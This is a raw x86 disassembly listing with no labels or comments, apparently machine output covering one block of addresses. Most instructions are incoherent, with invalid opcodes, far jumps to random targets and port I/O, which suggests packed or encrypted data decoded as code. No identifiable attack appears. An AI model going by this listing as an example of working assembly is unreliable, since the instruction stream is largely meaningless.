  41001d:	sbb    ebx,ebp
  41001f:	cmp    al,0x37
  410021:	rol    dh,cl
  410023:	pop    esp
  410024:	test   BYTE PTR [ebp-0xe3d6048],al
  41002a:	mov    cl,0x2f
  41002c:	push   esp
  41002d:	cmp    DWORD PTR [edi+0x28],0x34
  410031:	retf   
  410032:	adc    DWORD PTR [edi-0x4b],0x38336f90
  410039:	mov    ebp,0x92940045
  41003e:	rol    DWORD PTR [esi-0x7d370321],1
  410044:	jb     0x4100c5
  410046:	or     DWORD PTR [edx+0x1b],edi
  410049:	cmp    BYTE PTR [eax-0x29],bl
  41004c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41004d:	lock sub bh,cl
  410050:	mov    dl,0x19
  410052:	sub    eax,0x1e43204b
  410057:	jmp    0x4ff6:0xd19c34b8
  41005e:	xchg   edx,eax
  41005f:	mov    eax,ds:0x2261a052
  410065:	loopne 0x4100b2
  410067:	out    0x6a,al
  410069:	mov    eax,0xc78d2b50
  41006e:	xchg   esi,eax
  41006f:	fmul   DWORD PTR [edi+0x3a]
  410072:	mov    bl,0x6b
  410074:	ficomp DWORD PTR [eax+eax*4]
  410077:	or     al,0xab
  410079:	aad    0x2
  41007b:	jo     0x410017
  41007d:	ret    0x7488
  410080:	cmp    eax,0x32c4e011
  410085:	scas   al,BYTE PTR es:[edi]
  410086:	lods   al,BYTE PTR ds:[esi]
  410087:	sub    esp,esi
  410089:	xchg   ecx,eax
  41008a:	imul   esp,DWORD PTR [esi+0x585654b8],0x61
  410091:	and    dl,BYTE PTR [esi+edi*8+0x4b]
  410095:	and    al,0xe9
  410097:	dec    ebx
  410098:	ins    BYTE PTR es:[edi],dx
  410099:	(bad)
  41009c:	and    ch,BYTE PTR [edx]
  41009e:	adc    ecx,0xffffffd1
  4100a1:	jae    0x410110
  4100a3:	pop    es
  4100a4:	in     eax,0xb8
  4100a6:	dec    ecx
  4100a7:	sub    al,0xe2
  4100a9:	out    0x85,al
  4100ab:	mov    al,ds:0x3974b9bd
  4100b0:	pop    ds
  4100b1:	pop    esp
  4100b2:	shl    BYTE PTR [eax-0x399e5b2c],1
  4100b8:	add    esp,DWORD PTR [edi-0x4a72c3e]
  4100be:	sbb    BYTE PTR [ebx-0x1f8b7e0b],al
  4100c4:	in     eax,0x5f
  4100c6:	std    
  4100c7:	call   0xb8688e4
  4100cc:	sbb    ch,BYTE PTR [ebp-0x6924e3ad]
  4100d2:	mov    ebx,DWORD PTR [ebx]
  4100d4:	adc    BYTE PTR ds:0xbf61f2eb,0x89
  4100db:	mov    eax,ds:0x922dfcec
  4100e0:	sar    DWORD PTR [edi+0x5b],1
  4100e3:	xchg   ecx,eax
  4100e4:	pop    ds
  4100e5:	bound  eax,QWORD PTR [esi]
  4100e7:	mov    es,eax
  4100e9:	pop    esi
  4100ea:	fldcw  WORD PTR [ecx+0x5aee6ef8]
  4100f0:	je     0x41012a
  4100f2:	add    esp,ebx
  4100f4:	shr    dh,0x18
  4100f7:	pop    esp
  4100f8:	ret    
  4100f9:	pop    edx
  4100fa:	add    DWORD PTR [eax+0x1c3181b0],ecx
  410100:	sahf   
  410101:	sahf   
  410102:	cdq    
  410103:	jb     0x410166
  410105:	js     0x4100c3
  410107:	fs ror ebx,1
  41010a:	cmp    eax,0x62ab59a2
  41010f:	jae    0x410118
  410111:	jb     0x410117
  410113:	xor    bh,BYTE PTR [ebp+0x483bff5b]
  410119:	out    dx,al
  41011a:	sub    bl,BYTE PTR [ecx-0x5b]
  41011d:	xor    eax,0x80ff23f0
  410122:	in     al,dx
  410123:	jp     0x41010b
  410125:	jecxz  0x41014a
  410127:	out    dx,al
  410128:	and    BYTE PTR [ecx+esi*1+0x47],dl
  41012c:	in     eax,dx
  41012d:	out    0xfc,eax
  41012f:	mov    BYTE PTR [esi],0xb
  410132:	scas   al,BYTE PTR es:[edi]
  410133:	(bad)  
  410134:	cwde   
  410135:	cmp    BYTE PTR [ebx],0xd2
  410138:	(bad)  
  410139:	in     al,0x93
  41013b:	pop    esi
  41013c:	inc    esi
  41013d:	mov    ebp,0xa7f45836
  410142:	mov    eax,0xc7f03a81
  410147:	scas   al,BYTE PTR es:[edi]
  410148:	sub    al,0x39
  41014a:	ret    0x123d
  41014d:	mov    ?,WORD PTR [ecx]
  41014f:	aam    0xef
  410151:	sub    ecx,eax
  410153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410154:	(bad)  
  410155:	fdiv   QWORD PTR [edx+0x29299beb]
  41015b:	cdq    
  41015c:	xchg   ebp,eax
  41015d:	or     eax,0x7b492930
  410162:	scas   eax,DWORD PTR es:[edi]
  410163:	sbb    DWORD PTR gs:[esi+edx*1-0x28299be2],ebx
  41016b:	pop    eax
  41016c:	in     al,0x2e
  41016e:	repz push es
  410170:	xor    cl,BYTE PTR [ecx]
  410172:	and    al,0x76
  410174:	jmp    0x731b:0x6d374ba9
  41017b:	or     DWORD PTR [ecx],edi
  41017d:	add    dh,BYTE PTR [esi]
  41017f:	jp     0x410180
  410181:	jnp    0x4101a2
  410183:	je     0x410203
  410185:	aas    
  410186:	rcr    BYTE PTR [eax+0x59bcf7cb],0x97
  41018d:	push   0xffffff9a
  41018f:	fist   WORD PTR [esi-0x43]
  410192:	adc    BYTE PTR [esi],ch
  410194:	cmp    ebp,eax
  410196:	into   
  410197:	lds    edi,FWORD PTR [ebx]
  410199:	pop    ebx
  41019a:	call   0x7284:0x8a57675c
  4101a1:	fucomi st,st(2)
  4101a3:	mov    eax,DWORD PTR [eax+0x19]
  4101a6:	and    BYTE PTR [eax],cl
  4101a8:	(bad)  
  4101a9:	std    
  4101aa:	cmp    DWORD PTR [ecx-0x29],0x5b
  4101ae:	bound  esi,QWORD PTR [edx+0x2853773e]
  4101b4:	aad    0x18
  4101b6:	sub    al,0x9
  4101b8:	adc    ebx,edi
  4101ba:	sbb    al,0x59
  4101bc:	inc    edx
  4101bd:	pop    edx
  4101be:	shl    BYTE PTR [ebx+0x79b581f3],0x1c
  4101c5:	adc    DWORD PTR [eax+esi*2-0x9910557],ebp
  4101cc:	cmp    BYTE PTR [eax+0x416229d],al
  4101d2:	mov    eax,0xdf56e488
  4101d7:	imul   ebx,DWORD PTR [eax],0x13
  4101da:	sub    BYTE PTR [edi-0x69c6a24e],ah
  4101e0:	mov    bh,0x69
  4101e2:	xor    al,0x80
  4101e4:	jecxz  0x41024d
  4101e6:	mov    al,ds:0x49a63654
  4101eb:	or     bh,BYTE PTR [ebp-0x66]
  4101ee:	mov    ds:0x95687e42,eax
  4101f3:	pop    es
  4101f4:	adc    al,0x1a
  4101f6:	iret   
  4101f7:	xor    eax,0x4efc7a54
  4101fc:	daa    
  4101fd:	xchg   esi,eax
  4101fe:	out    0x86,eax
  410200:	mov    eax,0x1eab0824
  410205:	and    BYTE PTR [ebx-0x60],bh
  410208:	std    
  410209:	xchg   DWORD PTR [esi-0x2aee9241],edx
  41020f:	xlat   BYTE PTR ds:[ebx]
  410210:	inc    esi
  410211:	push   ecx
  410212:	push   esi
  410213:	stos   BYTE PTR es:[edi],al
  410214:	sbb    eax,0x8c2588ef
  410219:	stos   DWORD PTR es:[edi],eax
  41021a:	inc    ebx
  41021b:	into   
  41021c:	push   0xfffffffb
  41021e:	fs mov edx,ds
  410221:	aad    0xf6
  410223:	loope  0x4101fb
  410225:	dec    ecx
  410226:	inc    esp
  410227:	sub    ebp,DWORD PTR [ecx+0x3c6b36a5]
  41022d:	or     ebx,edx
  41022f:	xchg   edi,eax
  410230:	fdivr  st,st(1)
  410232:	sahf   
  410233:	pop    ds
  410234:	cmp    al,0x8e
  410236:	cmp    eax,0x783aeab5
  41023b:	mov    dh,0xc1
  41023d:	std    
  41023e:	loop   0x4102a7
  410240:	sti    
  410241:	imul   ecx,DWORD PTR [ebp-0x22],0xe9e30e8b
  410248:	imul   edi,DWORD PTR [ebx],0xffffffee
  41024b:	mov    BYTE PTR [edi+0x4],bh
  41024e:	dec    edx
  41024f:	mov    bl,0xad
  410251:	push   cs
  410252:	stc    
  410253:	rol    DWORD PTR [edx+0x5dbc2ad4],1
  410259:	das    
  41025a:	or     BYTE PTR [ebx+ecx*8-0x2b3f7303],ch
  410261:	dec    edx
  410262:	sub    al,0x45
  410264:	cmp    al,0x49
  410266:	xchg   esp,eax
  410267:	mov    edi,0x3280ccdc
  41026c:	push   edx
  41026d:	test   ch,dl
  41026f:	push   ss
  410270:	pop    ss
  410271:	aaa    
  410272:	dec    edi
  410273:	jo     0x41024c
  410275:	dec    edx
  410276:	mov    ecx,0xa2ed89b3
  41027b:	adc    BYTE PTR [edx],bl
  41027d:	retf   
  41027e:	or     BYTE PTR [edi+0x8],0xea
  410282:	xor    DWORD PTR [ebp-0xd75c677],0x36
  410289:	jmp    0x373c334a
  41028e:	sbb    esp,DWORD PTR [edx]
  410290:	mov    eax,ds:0x53ee9d8
  410295:	xchg   DWORD PTR [edi],ebx
  410297:	nop
  410298:	repz fidivr WORD PTR [ecx-0xa]
  41029c:	pop    es
  41029d:	adc    DWORD PTR [edx],0x93bb0a1b
  4102a3:	int3   
  4102a4:	push   ebx
  4102a5:	ss jg  0x410290
  4102a8:	pusha  
  4102a9:	add    cl,dl
  4102ab:	add    DWORD PTR [ecx-0x28d4a13],esp
  4102b1:	in     eax,dx
  4102b2:	scas   eax,DWORD PTR es:[edi]
  4102b3:	dec    edi
  4102b4:	jbe    0x4102e7
  4102b6:	pop    esi
  4102b7:	mov    al,ds:0xc87897ec
  4102bc:	and    BYTE PTR [ebp+0x4026ce85],dh
  4102c2:	dec    esp
  4102c3:	inc    eax
  4102c4:	cmp    eax,0x6e1b4e1d
  4102c9:	outs   dx,DWORD PTR ds:[esi]
  4102ca:	pushw  ds
  4102cc:	cmp    BYTE PTR [eax+0x4],ch
  4102cf:	aad    0x2a
  4102d1:	aaa    
  4102d2:	jmp    0x94355b89
  4102d7:	dec    eax
  4102d8:	or     bh,0x23
  4102db:	or     eax,0xf18ad4f4
  4102e0:	jl     0x41030d
  4102e2:	out    0xa8,eax
  4102e4:	aam    0x8
  4102e6:	jne    0x410272
  4102e8:	leave  
  4102e9:	add    DWORD PTR [ebx+eiz*2-0x6c],esp
  4102ed:	mov    esi,0x81feee35
  4102f2:	sahf   
  4102f3:	fcomi  st,st(1)
  4102f5:	jbe    0x41033a
  4102f7:	add    eax,ebx
  4102f9:	adc    BYTE PTR [eax+esi*8],0x18
  4102fd:	cdq    
  4102fe:	xlat   BYTE PTR ds:[ebx]
  4102ff:	and    esp,DWORD PTR [edx]
  410301:	add    ch,BYTE PTR [ecx-0x45]
  410304:	inc    edi
  410305:	aad    0x13
  410307:	or     ebx,DWORD PTR [ebx-0x17a952d6]
  41030d:	push   ss
  41030e:	sti    
  41030f:	test   eax,0x3fcfb24d
  410314:	test   BYTE PTR [edx+ebx*8-0x5f],ah
  410318:	inc    ebx
  410319:	loope  0x410300
  41031b:	mov    edi,ebp
  41031d:	xlat   BYTE PTR ds:[ebx]
  41031e:	test   eax,0x3da8a9e5
  410323:	gs sub cl,0xd6
  410327:	sti    
  410328:	pop    esp
  410329:	mov    esp,0x87e3088d
  41032e:	leave  
  41032f:	nop
  410330:	rcl    BYTE PTR [edx-0x66],cl
  410333:	xchg   DWORD PTR [edx],edi
  410335:	fwait
  410336:	inc    esp
  410337:	add    DWORD PTR [edi+0xa],edi
  41033a:	mov    al,ds:0x615d734b
  41033f:	fsub   st,st(5)
  410341:	push   ebp
  410342:	cmp    al,0x40
  410344:	in     al,dx
  410345:	push   edx
  410346:	fisttp WORD PTR [ebp-0x74eb1b19]
  41034c:	test   edx,0xa95552cc
  410352:	popf   
  410353:	adc    eax,0xa6ab1688
  410358:	jne    0x41031f
  41035a:	mov    ebp,0x5799bdad
  41035f:	pop    ebx
  410360:	ficomp DWORD PTR [ebp+0x73]
  410363:	dec    dl
  410365:	mov    ebx,0x20fd9208
  41036a:	mov    ch,0x63
  41036c:	xor    al,0xee
  41036e:	push   0x93cc0156
  410373:	mov    ebx,0x1dd63197
  410378:	mov    ss,WORD PTR [esi-0x55]
  41037b:	es in  al,0x5c
  41037e:	test   al,0x47
  410380:	int3   
  410381:	scas   eax,DWORD PTR es:[edi]
  410382:	fisttp WORD PTR [edi]
  410384:	xor    edi,DWORD PTR [ebx+0x4434fafd]
  41038a:	enter  0xa976,0xb1
  41038e:	cmc    
  41038f:	and    ch,BYTE PTR [esi-0x71eb957]
  410395:	mov    DWORD PTR [ebp+0x8],ecx
  410398:	add    eax,0x2082
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fe05
  4103a6:	add    ecx,DWORD PTR ds:0x42fe09
  4103ac:	mov    DWORD PTR ds:0x42fe05,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e21c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0xd7ea:0xdea7bab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	sar    bl,1
  4103dc:	jge    0x41037d
  4103de:	retf   
  4103df:	jle    0x41036a
  4103e1:	call   0x6629889f
  4103e6:	mov    edx,DWORD PTR [edi-0x5c]
  4103e9:	gs push edi
  4103eb:	aad    0xa5
  4103ed:	dec    edi
  4103ee:	cwde   
  4103ef:	(bad)  
  4103f0:	mov    dh,0x9b
  4103f2:	out    dx,al
  4103f3:	jecxz  0x4103ba
  4103f5:	arpl   WORD PTR [ecx-0x6f7e6551],ax
  4103fb:	sar    BYTE PTR [ecx+0x6423a45d],1
  410401:	dec    ecx
  410402:	jecxz  0x4103e3
  410404:	loop   0x410485
  410406:	pop    esp
  410407:	dec    ebp
  410408:	leave  
  410409:	in     al,0x7f
  41040b:	gs int3 
  41040d:	jp     0x410412
  41040f:	repnz sub DWORD PTR [edx],ebx
  410412:	sbb    DWORD PTR ds:0xb22da970,eax
  410418:	js     0x4103de
  41041a:	fsubr  QWORD PTR [ebp+0x5824a9fc]
  410420:	fiadd  DWORD PTR [edx]
  410422:	mov    bl,0x62
  410424:	fwait
  410425:	into   
  410426:	mov    ebp,ds
  410428:	push   ecx
  410429:	dec    edi
  41042a:	dec    ecx
  41042b:	rol    DWORD PTR [edx],1
  41042d:	out    dx,al
  41042e:	fsubr  st(3),st
  410430:	mov    al,ds:0x4fb90f97
  410435:	xchg   BYTE PTR [edx+ebp*1+0x349dafa1],dl
  41043c:	or     eax,0x9353fe41
  410441:	aad    0xdf
  410443:	and    al,0xee
  410445:	add    ah,BYTE PTR [edi+0x30ea6102]
  41044b:	push   eax
  41044c:	xor    BYTE PTR [edi+0x64],ah
  41044f:	jb     0x410461
  410451:	sub    eax,0x1e2c9f95
  410456:	sbb    eax,0x9503fddf
  41045b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41045c:	dec    esi
  41045d:	pop    esi
  41045e:	jmp    FWORD PTR [eax]
  410460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410461:	or     DWORD PTR [eax],edx
  410463:	mul    ch
  410465:	in     eax,dx
  410466:	push   es
  410467:	push   DWORD PTR [esi]
  410469:	test   BYTE PTR [ecx+0x19],bl
  41046c:	(bad)  
  41046d:	js     0x4104ed
  41046f:	adc    al,0x3
  410471:	and    BYTE PTR ss:[edi],dh
  410474:	aaa    
  410475:	rcl    BYTE PTR [ecx-0x6ed19817],0xbd
  41047c:	push   eax
  41047d:	mov    ebp,0x62d4ccf
  410482:	cdq    
  410483:	or     dh,bl
  410485:	cmp    BYTE PTR [ecx+0xa1b8b04],dl
  41048b:	adc    BYTE PTR [edx],ah
  41048d:	sub    eax,0x3d3b82a4
  410492:	call   0x77f42ae8
  410497:	mov    eax,0x5d612e04
  41049c:	jnp    0x410499
  41049e:	sub    DWORD PTR ds:0x7d03fdea,ebp
  4104a4:	jle    0x410481
  4104a6:	push   edi
  4104a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104a8:	out    dx,al
  4104a9:	ret    
  4104aa:	sbb    ebx,esp
  4104ac:	out    dx,al
  4104ad:	aaa    
  4104ae:	int    0x71
  4104b0:	out    0x9d,al
  4104b2:	test   eax,0xecbaafe6
  4104b7:	inc    eax
  4104b8:	mov    BYTE PTR [edx+ebp*8+0xe2fba26],0xc8
  4104c0:	mov    WORD PTR [ecx+0x1f],fs
  4104c3:	sahf   
  4104c4:	push   ebx
  4104c5:	(bad)  
  4104c6:	and    esp,DWORD PTR [edx+0x7c]
  4104c9:	popf   
  4104ca:	cld    
  4104cb:	aad    0x80
  4104cd:	stos   BYTE PTR es:[edi],al
  4104ce:	bound  ebp,QWORD PTR [ebx-0x62]
  4104d1:	push   esp
  4104d2:	ret    0xb91b
  4104d5:	shl    DWORD PTR [ebx],0x99
  4104d8:	dec    edi
  4104d9:	push   edi
  4104da:	adc    edx,DWORD PTR ds:0x7c233ce7
  4104e0:	add    DWORD PTR [ebp-0x4f],ebx
  4104e3:	mov    eax,ds:0x4886cf52
  4104e8:	mov    cl,BYTE PTR [edx+0x599f1d3c]
  4104ee:	jmp    FWORD PTR [esi+0x3106314b]
  4104f4:	sub    ebp,ecx
  4104f6:	pop    ss
  4104f7:	rol    DWORD PTR [ecx],1
  4104f9:	jle    0x4104a7
  4104fb:	adc    cl,BYTE PTR [edi-0x6e]
  4104fe:	loopne 0x4104b2
  410500:	inc    ebx
  410501:	dec    edx
  410502:	popf   
  410503:	arpl   WORD PTR es:[ebp-0x49],di
  410507:	into   
  410508:	push   eax
  410509:	or     DWORD PTR [ebp-0x32],esp
  41050c:	aaa    
  41050d:	and    eax,0x8879ea70
  410512:	xor    BYTE PTR [edx],bh
  410514:	sbb    al,0x67
  410516:	push   es
  410517:	dec    eax
  410518:	in     al,0xfc
  41051a:	adc    BYTE PTR [esi+eax*1],0x83
  41051e:	shl    BYTE PTR [ebx-0xc6bfc6d],1
  410524:	sar    DWORD PTR [eax],cl
  410526:	loopne 0x410520
  410528:	(bad)  
  410529:	hlt    
  41052a:	dec    esi
  41052b:	mov    ebp,0xeff63e92
  410530:	and    al,0xf7
  410532:	sahf   
  410533:	mov    al,ds:0x306ca006
  410538:	out    dx,al
  410539:	in     eax,0xe7
  41053b:	and    BYTE PTR [edi],al
  41053d:	mov    edx,0x4c7d466a
  410542:	test   DWORD PTR [edi],ecx
  410544:	cmc    
  410545:	push   esi
  410546:	enter  0xe3f,0x7
  41054a:	push   ss
  41054b:	aad    0x73
  41054d:	sar    dl,1
  41054f:	aad    0x71
  410551:	pushf  
  410552:	add    DWORD PTR [esi],edi
  410554:	hlt    
  410555:	push   es
  410556:	int3   
  410557:	mov    WORD PTR [esi],fs
  410559:	push   esp
  41055a:	pop    ebx
  41055b:	xchg   esi,eax
  41055c:	stos   DWORD PTR es:[edi],eax
  41055d:	mov    bh,0x6
  41055f:	sbb    DWORD PTR [eax+0x7a],edi
  410562:	mov    ah,BYTE PTR [edx+0x1f]
  410565:	test   cl,0xdb
  410568:	xchg   esi,eax
  410569:	rcl    ebx,cl
  41056b:	or     bh,BYTE PTR [ecx]
  41056d:	mov    ds:0x14fde716,eax
  410572:	retf   
  410573:	imul   ecx,DWORD PTR [ebp+0x79],0xffffffd5
  410577:	mov    eax,0x5d0f07dc
  41057c:	dec    ecx
  41057d:	and    al,0x8d
  41057f:	inc    eax
  410580:	je     0x410526
  410582:	xchg   esp,eax
  410583:	dec    esp
  410584:	push   ecx
  410585:	cdq    
  410586:	cdq    
  410587:	cmc    
  410588:	out    dx,al
  410589:	ret    
  41058a:	dec    eax
  41058b:	(bad)
  41058e:	mov    eax,0x57beace0
  410593:	inc    eax
  410594:	fistp  QWORD PTR [edx+0x54]
  410597:	cmp    eax,0x31942eed
  41059c:	jns    0x41059b
  41059e:	mov    dh,0xcf
  4105a0:	inc    edx
  4105a1:	std    
  4105a2:	adc    al,0x7e
  4105a4:	mov    ebp,DWORD PTR [edx]
  4105a6:	xlat   BYTE PTR ds:[ebx]
  4105a7:	mov    ebx,edi
  4105a9:	mov    ecx,0x934e3b65
  4105ae:	test   al,0x6d
  4105b0:	adc    eax,0xfc69b88b
  4105b5:	pop    edx
  4105b6:	sti    
  4105b7:	scas   al,BYTE PTR es:[edi]
  4105b8:	ror    DWORD PTR [ebp-0x14],cl
  4105bb:	sub    BYTE PTR [edi],dl
  4105bd:	and    al,0x14
  4105bf:	cmp    esi,ecx
  4105c1:	ret    
  4105c2:	xlat   BYTE PTR ds:[ebx]
  4105c3:	loop   0x4105a3
  4105c5:	into   
  4105c6:	pop    es
  4105c7:	test   DWORD PTR [ecx+0x77],ebp
  4105ca:	cld    
  4105cb:	or     DWORD PTR [edi-0x50],ecx
  4105ce:	pop    ss
  4105cf:	inc    ebx
  4105d0:	jnp    0x41060c
  4105d2:	jmp    0x41060f
  4105d4:	add    al,0x92
  4105d6:	pop    ds
  4105d7:	test   DWORD PTR [esi-0x57],ebp
  4105da:	lods   al,BYTE PTR ds:[esi]
  4105db:	jmp    0xf470f1d3
  4105e0:	popa   
  4105e1:	mov    eax,ds:0xfa26da45
  4105e6:	hlt    
  4105e7:	not    DWORD PTR [ecx]
  4105e9:	ret    0x6f02
  4105ec:	push   ss
  4105ed:	fisubr DWORD PTR [ebx-0x59]
  4105f0:	cmp    al,0x9e
  4105f2:	dec    esi
  4105f3:	jg     0x4105dc
  4105f5:	sbb    BYTE PTR [edi-0x10],cl
  4105f8:	lods   al,BYTE PTR ds:[esi]
  4105f9:	pop    es
  4105fa:	(bad)  
  4105fb:	out    dx,eax
  4105fc:	push   ds
  4105fd:	push   esp
  4105fe:	pop    ds
  4105ff:	fdiv   DWORD PTR [esi]
  410601:	repnz test DWORD PTR [ebp+0x19f7395d],0x74f4ff13
  41060c:	and    BYTE PTR [ebp*1-0x5461c275],ch
  410613:	cmp    BYTE PTR [ecx+0x29],bh
  410616:	push   es
  410617:	fxch   st(3)
  410619:	push   esi
  41061a:	push   ss
  41061b:	ds aas 
  41061d:	sub    al,0x56
  41061f:	lea    edi,fs:[eax+ebp*1]
  410623:	mov    dl,0xbd
  410625:	push   ecx
  410626:	push   ebx
  410627:	xchg   esi,eax
  410628:	pushf  
  410629:	jg     0x410618
  41062b:	(bad)  
  41062d:	mov    esi,0x27fe617e
  410632:	into   
  410633:	aaa    
  410634:	call   0xca0e9c87
  410639:	cmp    ah,BYTE PTR [edx]
  41063b:	test   BYTE PTR [edi-0x44ab33f6],bl
  410641:	sub    ebp,esi
  410643:	lock lea edx,ss:[edi]
  410647:	cs cmp al,0x78
  41064a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41064b:	jle    0x410663
  41064d:	scas   eax,DWORD PTR es:[edi]
  41064e:	mov    ah,0xd8
  410650:	adc    BYTE PTR [esi],dl
  410652:	call   0x31cc:0x1897d30c
  410659:	push   eax
  41065a:	shl    ch,cl
  41065c:	push   ebp
  41065d:	pusha  
  41065e:	push   cs
  41065f:	mov    ah,0x8d
  410661:	sti    
  410662:	push   ss
  410663:	out    dx,al
  410664:	in     eax,dx
  410665:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410666:	push   edi
  410667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410668:	int    0x8c
  41066a:	add    dh,ch
  41066c:	imul   ebx,edx,0xddfd4da4
  410672:	or     al,0xd9
  410674:	std    
  410675:	stos   BYTE PTR es:[edi],al
  410676:	shl    BYTE PTR [edi-0xd],0xe0
  41067a:	ror    DWORD PTR [ebx+ebx*2-0x4a],0x1d
  41067f:	daa    
  410680:	inc    ecx
  410681:	inc    ebx
  410682:	jmp    0x4d424349
  410687:	mov    dh,0x3d
  410689:	sub    BYTE PTR [ebx+ebx*8-0x6ada2c6f],al
  410690:	fistp  DWORD PTR [ebp-0x52]
  410693:	(bad)  
  410694:	lahf   
  410695:	fimul  WORD PTR [esi+ecx*2+0xda80eea]
  41069c:	test   eax,0x677b922b
  4106a1:	test   eax,0xffbd62d9
  4106a6:	popf   
  4106a7:	lods   eax,DWORD PTR ds:[esi]
  4106a8:	retf   0xf5bc
  4106ab:	sbb    eax,0x402ef968
  4106b0:	xor    ebx,ecx
  4106b2:	push   esi
  4106b3:	jge    0x410674
  4106b5:	cmp    BYTE PTR [ebx+0x68],ah
  4106b8:	test   BYTE PTR gs:[edx+0x65],ah
  4106bc:	push   ebx
  4106bd:	es ret 
  4106bf:	sbb    ebx,esp
  4106c1:	(bad)  
  4106c2:	fwait
  4106c3:	pop    edx
  4106c4:	adc    al,0x5
  4106c6:	sub    ebp,DWORD PTR [ecx+0x17]
  4106c9:	lahf   
  4106ca:	call   0x3e6d:0xcda5511d
  4106d1:	mov    al,ds:0xcc2ecd05
  4106d6:	cmp    al,0x54
  4106d8:	das    
  4106d9:	mov    WORD PTR [eax],ss
  4106db:	je     0x410660
  4106dd:	pop    eax
  4106de:	xchg   BYTE PTR [ecx+0x2963be0d],al
  4106e4:	movzx  esi,WORD PTR [ecx]
  4106e7:	(bad)  
  4106e8:	or     esp,DWORD PTR [eax-0x57]
  4106eb:	cmp    eax,0x596fbc67
  4106f0:	xchg   edx,eax
  4106f1:	ret    
  4106f2:	add    ah,bh
  4106f4:	pushw  0x6b
  4106f7:	nop
  4106f8:	mov    cl,BYTE PTR [ebx+0x481572d]
  4106fe:	cld    
  4106ff:	cmp    DWORD PTR [edx],edi
  410701:	loopne 0x410695
  410703:	xor    al,0x8c
  410705:	pop    ss
  410706:	mov    ?,edx
  410708:	adc    eax,0x7286beea
  41070d:	push   ecx
  41070e:	addr16 xor eax,0xb0870fac
  410714:	mov    BYTE PTR [esi],bh
  410716:	jno    0x4106ba
  410718:	sahf   
  410719:	ins    DWORD PTR es:[edi],dx
  41071a:	call   0x8cf581b6
  41071f:	test   al,0x34
  410721:	(bad)
  410724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410725:	dec    edx
  410726:	clc    
  410727:	in     eax,0x45
  410729:	jg     0x410791
  41072b:	xor    esi,DWORD PTR [ebp+0x58]
  41072e:	push   esi
  41072f:	cmc    
  410730:	out    0x5d,al
  410732:	xor    edx,edi
  410734:	js     0x41071b
  410736:	xchg   ecx,eax
  410737:	fmul   QWORD PTR [edx+0x65674aac]
  41073d:	dec    eax
  41073e:	sub    BYTE PTR [eax+0x2a],0x1e
  410742:	ficomp DWORD PTR [edx+0x15]
  410745:	xor    dh,al
  410747:	sbb    esp,DWORD PTR [edx]
  410749:	and    ch,ah
  41074b:	push   ss
  41074c:	cmp    edi,eax
  41074e:	mov    esi,0xd7fd6696
  410753:	call   0xf74b:0x199d4069
  41075a:	cmc    
  41075b:	outs   dx,BYTE PTR ds:[esi]
  41075c:	push   ebp
  41075d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41075e:	pop    es
  41075f:	call   0x9b0a:0x5ae2f63c
  410766:	jp     0x41076f
  410768:	and    eax,0x14a7461d
  41076d:	mov    dh,0x5c
  41076f:	(bad)  
  410770:	mov    ch,0xff
  410772:	xchg   esp,eax
  410773:	pop    esi
  410774:	inc    ebp
  410775:	sbb    eax,0x7549002d
  41077a:	rcr    DWORD PTR [esi+0x6f729b2f],cl
  410780:	xor    DWORD PTR [edi],esi
  410782:	data16 loop 0x4107ba
  410785:	adc    BYTE PTR [ebx+ecx*4-0x267ef78b],bl
  41078c:	es das 
  41078e:	add    BYTE PTR [eax],al
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	push   cs
  4107a9:	scas   al,BYTE PTR es:[edi]
  4107aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107ab:	pop    esi
  4107ac:	mov    eax,DWORD PTR [esi+0x70]
  4107af:	jo     0x410754
  4107b1:	jge    0x410823
  4107b3:	jo     0x41074c
  4107b5:	and    BYTE PTR [edx+0x1],al
  4107b8:	push   es
  4107b9:	leave  
  4107ba:	xchg   DWORD PTR [ecx-0x2e],edi
  4107bd:	pusha  
  4107be:	xlat   BYTE PTR ds:[ebx]
  4107bf:	outs   dx,DWORD PTR ds:[esi]
  4107c0:	mov    dl,0xcb
  4107c2:	mov    edi,0x4c60e73
  4107c7:	mov    edi,0x101fca96
  4107cc:	mov    al,ds:0x6f4f2386
  4107d1:	sbb    bh,BYTE PTR [ebx+0x6d]
  4107d4:	clc    
  4107d5:	and    dl,ch
  4107d7:	adc    eax,0x3b8b1a7b
  4107dc:	sub    al,0xdf
  4107de:	jbe    0x4107c5
  4107e0:	cmp    al,0xe
  4107e2:	cmc    
  4107e3:	(bad)  
  4107e4:	adc    al,0x8a
  4107e6:	aam    0x2b
  4107e8:	ss retf 
  4107ea:	push   0xec73bbff
  4107ef:	push   0x4e21fec5
  4107f4:	xchg   ecx,eax
  4107f5:	lods   al,BYTE PTR ds:[esi]
  4107f6:	adc    ebx,DWORD PTR [edx+0x34]
  4107f9:	mov    al,0xca
  4107fb:	push   ecx
  4107fc:	scas   al,BYTE PTR es:[edi]
  4107fd:	retf   
  4107fe:	leave  
  4107ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410800:	out    dx,al
  410801:	xchg   ebx,eax
  410802:	mov    esp,0x2f7da95e
  410807:	fld    DWORD PTR [esi]
  410809:	in     al,0x22
